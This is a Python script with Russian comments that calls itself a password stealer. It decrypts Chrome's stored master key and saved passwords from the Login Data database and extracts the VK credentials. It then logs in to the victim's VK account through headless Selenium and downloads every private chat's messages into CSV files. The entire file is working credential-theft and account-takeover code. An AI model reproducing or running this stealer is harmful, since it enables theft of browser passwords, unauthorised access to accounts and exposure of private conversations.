import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime
from time import sleep

import pandas as pd
import requests
import win32crypt
from Cryptodome.Cipher import AES
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager


def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        print("Невозможно получить пароль, так как ваша версия хром больше v80\n")
        print(str(e))
        return "Chrome < 80"


def stiller_chrome():
    master_key = get_master_key()
    data = {}
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                     os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        login_data = cursor.fetchall()
        for url, user_name, pwd, in login_data:
            encrypted_password = pwd
            pwd = decrypt_password(encrypted_password, master_key)
            if pwd != '':
                data[url] = (user_name, pwd)
    return data


def create_driver():
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(options=options, service=service)


def put_field(driver, teg, data, put):
    inp = driver.find_element(teg, data)
    inp.clear()
    inp.send_keys(put)


def click_field(driver, teg, data):
    driver.find_element(teg, data).click()
    sleep(3)


def logging(driver, number, password):
    put_field(driver, By.ID, "index_email", number)
    click_field(driver, By.CLASS_NAME, "FlatButton--primary")
    click_field(driver, By.CSS_SELECTOR, "button.vkc__Bottom__switchToPassword")
    put_field(driver, By.NAME, "password", password)
    click_field(driver, By.CLASS_NAME, "vkuiButton--lvl-primary")


def authorization(url: str, number: str, password: str):
    #Создание сессии драйвера и авторизация на сайте
    driver = create_driver()
    driver.get(url)
    logging(driver, number, password)

    #Скриншот успешной авторизации и получение id пользователя
    driver.save_screenshot("auth_done.png")
    uid = driver.execute_script("return window.vk.id;")

    return driver, uid


def parse_page(response):
    response_text = response.text
    json_str = json.loads(response_text[4:])
    res = json_str['payload'][1][1:][0]
    has_more = json_str['payload'][1][0].get('has_more')
    peer_ids = []
    minor_sort_id = 0
    for item in res.items():
        item = item[1]
        peer_id = item.get('peerId')
        peer_ids.append(peer_id)
        minor_sort_id = item.get('minor_sort_id')
    return peer_ids, minor_sort_id, has_more


def parse_list_id(session):
    list_id = []
    last_msg_id = 0
    has_more = True
    while has_more:
        param = {
            'act': 'a_get_dialogs',
            'al': '1',
            'gid': '0',
            'im_v': '3',
            'is_layer': '0',
            'lang': 'en',
            'offset': '0',
            'tab': 'all',
            'start_message_id': last_msg_id
        }
        response = session.post('https://vk.com/al_im.php', params=param)
        sub_id, last_msg_id, has_more = parse_page(response)
        list_id += sub_id
    return list_id


def parse_message_data(req, uid):
    req_text = req.text
    json_str = json.loads(req_text[4:])
    payload = json_str['payload']
    data_msg = payload[1][1]

    if not data_msg:
        return '', '', [], [], False, 0

    items = data_msg.items()
    lst = list(items)
    length = 0
    is_group = True if lst[0][1][5].get('from') else False
    type_chat = 'group' if is_group else 'personaly'
    messages, list_msg_id, times = [], [], []

    for item in items:
        item = item[1]
        time = item[3]
        message_text = item[4]
        if is_group:
            id_from = item[5].get('from')
        else:
            id_from = uid if item[7] != 0 else item[2]
        messages.append(message_text)
        list_msg_id.append(id_from)
        times.append((datetime.fromtimestamp(float(time))).strftime("%m/%d/%Y, %H:%M:%S"))
        length += 1
    return type_chat, times, list_msg_id, messages, True, length


def parse_message(session, uid, chat_id):
    type_chat = ''
    list_messages, list_ids, list_times = [], [], []
    has_more = True
    length = 0
    while has_more:
        param = {
            'act': 'a_history',
            'al': '1',
            'gid': '0',
            'im_v': '3',
            'offset': length,
            'peer': chat_id,
            'toend': '1',
            'whole': '0',
        }
        req = session.post('https://vk.com/al_im.php?act=a_start', params=param)
        type_chats, times, list_msg_id, messages, has_more, d_length = parse_message_data(req, uid)
        if type_chats:
            type_chat = type_chats
        length += d_length
        list_ids += list_msg_id
        list_messages += messages
        list_times += times
    df_message = pd.DataFrame({'id_sender': list_ids, 'message': list_messages, 'time': list_times})
    return df_message, type_chat


def get_data(auth_driver, uid, some=None):
    # Создание папки с будущими чатами юзера
    adr = 'Archive_' + str(uid)
    if not os.path.exists(adr):
        os.mkdir(adr)

    # Создание request сессии на основе данных драйвера
    auth_driver.get('https://vk.com/im')
    session = requests.Session()
    selenium_user_agent = auth_driver.execute_script("return navigator.userAgent;")
    session.headers.update({"user-agent": selenium_user_agent})
    for cookie in auth_driver.get_cookies():
        session.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])

    # Получение списка id чатов с последующим обходом по каждому чату и извлечении информации сообщений
    list_chat_id = (parse_list_id(session))[:some]
    for chat_id in list_chat_id:
        df_message, chat_type = parse_message(session, uid, chat_id)
        name_csv = os.path.join(adr + '/', 'messages_' + chat_type + '_' + str(chat_id) + '.csv')
        df_message.to_csv(name_csv)
        print(' Содержимое чата id = ', chat_id, '\tуспешно сохранено')
    return


if __name__ == '__main__':
    '''
    --------------------------------------vk api не используется-----------------------------------------
    Этот код собирает сохранённые данные логинов и паролей и использует для авторизации в ВК.
    Далее, берёт headers и cookies из драйвера selenium для POST запросов.
    Далее, обработка response как json объект и извлечение необходимых данных.
    Далее, композиция данных в data frame и сохранение в папке.
    Данные - все сообщения каждого чата юзера.
    
    Описание полученных data frame:
    В папке Archive_'user_id' хранятся csv-файлы в формате:
        Status_Chat + Id_Chat + .csv
        Где Status_Chat может быть Pesonaly или Group в зависимости от типа чата (личка, беседа)
        Id_Chat - id чата 
        В самом файле содержатся информация сообщений чата. (Id отправителя, текст, время)
    '''

    # Стиллер сохранённых паролей браузера
    print('Получение данных...')
    data_hack = stiller_chrome()
    login, psw = data_hack['https://id.vk.com/auth']
    print('Логин и пароль успешно получены' + '\n',
          'Логин:', login + '\n',
          'Пароль:', psw)

    # Авторизация с пременением парсинга
    print('Авторизация...')
    vk_driver, user_id = authorization("https://vk.com/login", login, psw)
    print('Авторизация прошла успешно' + '\n',
          'id пользователя = ', user_id)

    # Post-запросы и создание df
    print('Получение содержимого чатов...')
    get_data(vk_driver, user_id)
    print('Чаты получены')
